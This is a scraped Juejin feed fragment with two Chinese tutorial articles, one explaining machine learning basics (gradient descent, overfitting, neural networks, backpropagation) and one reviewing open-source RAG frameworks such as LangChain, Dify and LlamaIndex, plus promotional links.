Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>本文旨在用简单易懂的语言解释大语言模型的基本原理，不会详细描述和解释其中的复杂数学和算法细节，希望各位小猫能有所收获 🐱</p>
<h2 data-id="heading-0">AI 的科技树</h2>
<p>我们先来通过一条简单的链路，定位大模型在 AI 领域的位置： 人工智能 &gt; 机器学习 &gt; 深度学习 &gt; 大语言模型</p>
<p>机器学习最开始就用<strong>大量数据</strong>做<strong>线性回归</strong>从而对未知数据进行推测。</p>
<p>举个最简单的例子，二维的数据。直接就可以使用数学课就学过的线性回归求方程获取数据的趋势。</p>
<p>接着，人类不满足于简单的线性回归，想要让计算机自动学习更复杂的数据特征，于是就有了深度学习。</p>
<h3 data-id="heading-1">深度学习</h3>
<p>深度学习之所以深度是因为，它基于<strong>多层神经网络</strong>自动学习数据特征。多层神经网络就像人脑的神经元互相连接。每根连接的强度就是<strong>权重</strong>，网络会反复调整这些强度，让结果越来越接近正确答案。</p>
<p>代表性模型有：卷积神经网络（CNN）、循环神经网络（RNN）、Transformer、GAN 等。</p>
<h3 data-id="heading-2">大语言模型</h3>
<p>Transformer 无情压榨 GPU 产生的奇迹，起初应该没人觉得这效果能这么好。</p>
<p>与深度学习一样，Transformer 也是使用多层神经网络处理矩阵，只不过矩阵异常的大，不到硬件发展到一定水平根本无法实现。</p>
<p>关于大语言模型我们停一下，先比较基础的机器学习原理！</p>
<h2 data-id="heading-3">训练的方式</h2>
<p>还是从最简单的二维数据开始。</p>
<p>当我们有一堆房产离市中心距离及其价格的数据时，我们可以在一个二维坐标轴表示这些数据，例如 x 轴是距离，y 轴是价格。</p>
<p>在数据都画上坐标轴之后，作为一个人类可能一眼就能粗略看出整个曲线的趋势，从而“拟合”出一条距离价格的关系。</p>
<p>它很可能是一个类似这样的函数：<code>price = distance * w + b</code>。</p>
<p>对于计算机，要求出 w 和 b 的最优解，就要让真实价格和通过 w b 计算出来的价格的差值最少。</p>
<p>最常用的方式是<strong>均方误差（Mean Squared Error, MSE）</strong> ：</p>
<p>我们要求的就是这个函数的最小值，在人工智能领域常用的就是<strong>梯度下降</strong>，也就是求 w 和 b 的偏导数，乘上学习率 α，让它自己慢慢收敛。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8f83d9b45fe4a728a3f6790a5b4c08a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612762&amp;x-signature=QC7UlcJC8PUd31OJgbTIZP3X3AM%3D" alt="" loading="lazy"/></p>
<p>梯度下降</p>
<h3 data-id="heading-4">过拟合</h3>
<p>在拟合出一条接近“规律”的线条后，其实就差不多了。</p>
<p>如果你硬加更多的节点，会造成过拟合，也就所有的训练数据的损失值都很完美，但是一让它生成训练数据以外的东西，它就猜不准了。</p>
<p>就上面房价的例子，假如本来趋势基本就是一个斜线，但是你最后硬是求得一条曲线方程，把所有的点都穿过了，损失值为 0，但是这样计算用户给你的值，反而是算不准的。</p>
<p>这也就是所谓的<strong>失去泛化能力</strong>。</p>
<h2 data-id="heading-5">神经网络</h2>
<p>上面只用二维数据，就只有一个 <code>price = distance * w + b</code>，但是如果想要做成神经网络，参数就会很多，并且与权重相乘的值的含义，<strong>人类并不能轻易理解</strong>，例如：</p>
<p>又因为如果只用权重，无论经过多少层都无法拟合曲线，所以最后要添加一个<strong>非线性的激活函数</strong>计算结果：</p>
<p>这只是一个层对某一个神经元的计算，下面是一个比较形象的图（请忽略数字）</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fc6e07dac7a4b9a96022b7dd40e32cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612762&amp;x-signature=ouHpF3GLDI8%2B0oLex1rwumTCi4c%3D" alt="" loading="lazy"/></p>
<p>某层对下一个神经元的计算</p>
<p>所以当一个神经网络有<strong>多层</strong>，每层<strong>多个</strong>神经元的话计算量还是挺可怕的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f7277755b614ae5a24d1285b870699b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612762&amp;x-signature=jyjMDpLpY%2F1ZKP%2FHPiI9GTqOwwg%3D" alt="" loading="lazy"/></p>
<p>神经网络</p>
<p>比如判断一张图片有没有猫，你没法用一条简单的线来划分"有猫"和"没猫"的区域。</p>
<p>多层网络的魔力在于：</p>
<ul>
<li>• <strong>逐层特征提取</strong>：第一层可能只学到边缘和颜色，第二层学到边缘组成的形状，第三层学到眼睛、耳朵，第四层才认识完整的猫脸</li>
<li>• <strong>非线性组合</strong>：通过激活函数，每一层都能创造新的特征组合，让网络可以表示任意复杂的函数</li>
<li>• <strong>层次化抽象</strong>：就像人类认识世界一样，先学简单概念，再组合成复杂概念</li>
</ul>
<p>这就等于在计算的时候把数据的内涵升维到隐藏层，经过隐藏层额外的处理可以得到更精确的结果。当然这个时候你输入的值也要有足够的信息量它才能学到东西。</p>
<p>但问题又来了既然多层这么强大，那是不是层数越多越好？也不是的。神经网络有两个维度可以调整：</p>
<p><strong>深度（Deep）</strong> ：层数多，每层神经元少</p>
<ul>
<li>• 参数少，计算效率高</li>
<li>• 适合层次化特征学习</li>
<li>• 容易出现梯度消失（层数太多，误差传不到前面）</li>
<li>• 训练困难</li>
</ul>
<p><strong>宽度（Wide）</strong> ：层数少，每层神经元多</p>
<ul>
<li>• 训练相对简单</li>
<li>• 能并行处理更多信息</li>
<li>• 参数量大，容易过拟合</li>
<li>• 缺乏层次化抽象能力</li>
</ul>
<p>实际训练时<strong>深度和宽度的平衡</strong>需要把握好。</p>
<h2 data-id="heading-6">反向传播</h2>
<p>上面我们知道用梯度下降的方式调节 w 和 b，对于神经网络也是一样的数学原理，需要通过链式法则（Chain Rule）一层一层反向调整所有权重。</p>
<p>这里就不详细解释怎么层层反推了，就结果而言，我们给出了正确的输入和输出，最开始，这个网络只是瞎猜权重，到最后计算出来，<strong>经过损失函数梯度下降调整各种权重</strong>，到最后，竟然就可以像魔法一样推导出准确率比较高的答案，喵，喵，喵呀！</p>
<p>P.S. 如果你真的找虐很想了解更多反向传播的计算过程，可以看 3blue1brown 🐱</p>
<h2 data-id="heading-7">参考资料</h2>
<ul>
<li>• 3blue1brown Neural Networks</li>
<li>• tensorflow playground</li>
</ul>
<h2 data-id="heading-8">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[构建自己的Agent——最佳开源 RAG 框架选型指南]]></title>    <link>https://juejin.cn/post/7580270531470049326</link>    <guid>https://juejin.cn/post/7580270531470049326</guid>    <pubDate>2025-12-06T07:59:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580270531470049326" data-draft-id="7580277964341215242" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="构建自己的Agent——最佳开源 RAG 框架选型指南"/> <meta itemprop="keywords" content="LLM,Agent,程序员"/> <meta itemprop="datePublished" content="2025-12-06T07:59:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            构建自己的Agent——最佳开源 RAG 框架选型指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T07:59:16.000Z" title="Sat Dec 06 2025 07:59:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>话不多说，今天，为大家介绍几款<strong>适合普通人使用的RAG平台</strong>，让你也能轻松打造专属AI知识库！直接上菜：</p>
<h3 data-id="heading-0"><strong>1. LangChain - ⭐️105k</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff087b96330c49a188c22acd279c7b8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=pelFWp9BbYQuhFVrdVgshHbhQAg%3D" alt="" loading="lazy"/></p>
<p>作为LLM应用开发的“老牌框架”，LangChain在RAG生态中稳居C位。它提供了一套完整的组件化方案，让你能像搭乐高一样连接数据、模型和工具，轻松构建可进化的AI应用。</p>
<p><strong>亮点功能</strong>：</p>
<ul>
<li><strong>数据连接</strong>：无缝集成多种数据源，从API到PDF都能搞定</li>
<li><strong>灵活切换</strong>：支持不同模型和检索策略，随心调配</li>
<li><strong>生态强大</strong>：与LangSmith调试、LangGraph工作流管理完美配合</li>
<li><strong>安装一句搞定</strong>：<code>pip install -U langchain</code>，新手也能快速上手！</li>
</ul>
<h3 data-id="heading-1">2.  Dify - ⭐️90.5k</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b163cacec2734ae489216d22bc16bbd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=%2BIuV0Jh6vpFlMiYjxAAo5hTuRts%3D" alt="" loading="lazy"/></p>
<p>如果说LangChain是“代码级工具”，那Dify就是<strong>可视化版的AI应用工厂</strong>！它通过拖拽式工作流，让非技术用户也能快速搭建带RAG能力的智能助手。</p>
<p><strong>为什么选它</strong>：</p>
<ul>
<li><strong>界面友好</strong>：零代码拼装AI流程，像画流程图一样简单</li>
<li><strong>全家桶服务</strong>：从文档解析、检索到Agent编排全部内置</li>
<li><strong>模型海量</strong>：支持数百个开源/商用模型，随便换着用</li>
<li><strong>部署神器</strong>：用Docker Compose一条命令就能跑起来，5分钟开启AI开发之旅！</li>
</ul>
<h3 data-id="heading-2"><strong>3. RAGFlow - ⭐️48.5k</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ee9903a173c4015b22d576a0da5c79f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=1C4NhoIzXABXueEpOp3traRRJ%2F4%3D" alt="" loading="lazy"/></p>
<p>如果你常和<strong>复杂文档</strong>（比如带表格的PDF、技术手册）打交道，RAGFlow就是你的“天菜”！它凭借深度文档解析技术，能精准提取表格、公式甚至版面结构。</p>
<p><strong>独门绝技</strong>：</p>
<ul>
<li><strong>表格识别王者</strong>：财务报告、学术论文中的表格提取准确率超95%</li>
<li><strong>可视化溯源</strong>：答案直接关联原文段落，拒绝AI“胡说八道”</li>
<li><strong>GraphRAG支持</strong>：自动构建知识图谱，让检索更智能</li>
<li><strong>适合场景</strong>：法律、金融、医疗等对准确性要求高的专业领域。</li>
</ul>
<h3 data-id="heading-3"><strong>4. LlamaIndex - ⭐️40.8k</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f57704c02b749fbb656ea1ccc0a33f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=iuhupX0QoVVq%2FQJuxv2kCIOJLTk%3D" alt="" loading="lazy"/></p>
<p>专为<strong>数据索引而生</strong>的轻量级框架！如果你的核心需求是把散落各处的文件（本地文档、数据库、网页）快速变成AI可查询的知识库，LlamaIndex就是你的最佳拍档。</p>
<p><strong>核心优势</strong>：</p>
<ul>
<li><strong>连接器大户</strong>：支持300+数据源，爬网页、读PDF、捞数据库样样行</li>
<li><strong>索引黑科技</strong>：提供向量/关键词/图谱混合索引，检索精度翻倍</li>
<li><strong>模块化设计</strong>：自由组合组件，定制专属RAG流水线</li>
<li><strong>入门代码仅3行</strong>：安装后即可提取文档→构建索引→开启智能问答！</li>
</ul>
<h3 data-id="heading-4"><strong>5. Milvus - ⭐️33.9k</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40bf0844385647a2a796980dd61cf24a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=g%2FujElO54xPaf2v%2BPQVXhiPgcuQ%3D" alt="" loading="lazy"/></p>
<p>严格来说，Milvus不是RAG框架，而是<strong>高性能向量数据库</strong>（相当于RAG的“记忆中枢”）。当你的知识库文件超过10万份时，它就是保证检索速度的<strong>秘密武器。</strong></p>
<p><strong>性能怪兽表现</strong>：</p>
<ul>
<li><strong>毫秒级搜索</strong>：在10亿级向量中找相似项，快如闪电</li>
<li><strong>混合查询</strong>：同时支持向量搜索+关键词过滤+数值筛选</li>
<li><strong>云原生设计</strong>：轻松扩展至多机集群，企业级数据量无压力</li>
<li><strong>搭配建议</strong>：可与LangChain/LlamaIndex组合使用，构建工业级RAG系统</li>
</ul>
<h3 data-id="heading-5"><strong>6. mem0 - ⭐️27.3k</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e4e1b278dde4a5f90a24f761b7c4129~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=Jrddw%2FCd5W3zeq0wO4ovnonaYOU%3D" alt="" loading="lazy"/></p>
<p>给AI加个“长期记忆”是什么体验？mem0正是这样一个<strong>智能记忆层</strong>，让AI能记住跨对话的上下文（比如你的偏好、历史问题），打造真正懂你的助手。</p>
<p><strong>记忆魔法</strong>：</p>
<ul>
<li><strong>多会话记忆</strong>：自动保存重要信息，下次聊天无缝衔接</li>
<li><strong>自学习能力</strong>：AI会主动提炼对话重点，优化记忆存储</li>
<li><strong>双存储引擎</strong>：向量数据库存细节，图谱数据库理关系</li>
<li><strong>使用场景</strong>：适合打造个性化客服、长期研究助手等需要“记忆延续”的应用。</li>
</ul>
<h3 data-id="heading-6"><strong>7. DSPy - ⭐️23k</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/385a33e6fffd4147aaba48e826152252~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=5tDAXorCft0WyQUFtDwraI62zaI%3D" alt="" loading="lazy"/></p>
<p>来自斯坦福的<strong>编程框架</strong>，主打“用代码优化代码”！DSPy通过声明式编程自动优化RAG流程，适合厌倦手动调参、追求自动化效果的开发者。</p>
<p><strong>革命性特性</strong>：</p>
<ul>
<li><strong>自动调优提示词</strong>：无需手动反复调试，系统自动优化提问方式</li>
<li><strong>模块化编译</strong>：将RAG流程拆解成可复用、可优化的组件</li>
<li><strong>自我改进管道</strong>：根据测试数据反向调整检索和生成策略</li>
<li><strong>玩家推荐</strong>：适合技术团队构建高精度、可迭代的RAG系统。</li>
</ul>
<h3 data-id="heading-7"><strong>8. Haystack - ⭐️20.2k</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1878eaded0ba4956b8c04e9cb43f542b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=qo%2BCUp6ArjL9VOLRH6RtPO17GZE%3D" alt="" loading="lazy"/></p>
<p>深谙“大厂同款”的<strong>端到端框架</strong>，集成了RAG、Agent、评估等全套工具链。它的核心理念是：用标准化组件，快速搭建生产级AI应用。</p>
<p><strong>企业级功能</strong>：</p>
<ul>
<li><strong>流水线工厂</strong>：拖拽组件设计复杂RAG流程，支持条件分支/循环</li>
<li><strong>技术中立性</strong>：任意切换模型/向量库，避免被某一技术绑定</li>
<li><strong>监控无忧</strong>：内置评估模块，实时跟踪回答质量与系统性能</li>
<li><strong>亮点</strong>：提供可视化设计器Deepset Studio，降低复杂流程的搭建门槛。</li>
</ul>
<p><strong>选择正确的 RAG 框架的对比决策表</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/900e75e56fd747a58efc297be2e3fe80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612755&amp;x-signature=%2F6EGEUH9Mw8fbfP4NHv654vEf6U%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>小白尝鲜</strong>：选<strong>Dify</strong>——界面最友好，拖拽就能用</li>
<li><strong>处理专业文档</strong>：选<strong>RAGFlow</strong>——表格/公式解析能力最强</li>
<li><strong>快速索引数据</strong>：选<strong>LlamaIndex</strong>——数据连接器最多，轻量又专注</li>
<li><strong>搞长期记忆项目</strong>：选<strong>mem0</strong>——让AI真正“记住你”</li>
<li><strong>企业级需求</strong>：<strong>Haystack</strong>或<strong>LangChain</strong>+<strong>Milvus</strong>组合，稳！</li>
</ul>
<p>希望这份“品尝指南”帮你找到最适合的RAG工具！如果你有具体的使用场景，欢迎留言一起讨论～</p>
<h2 data-id="heading-8">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
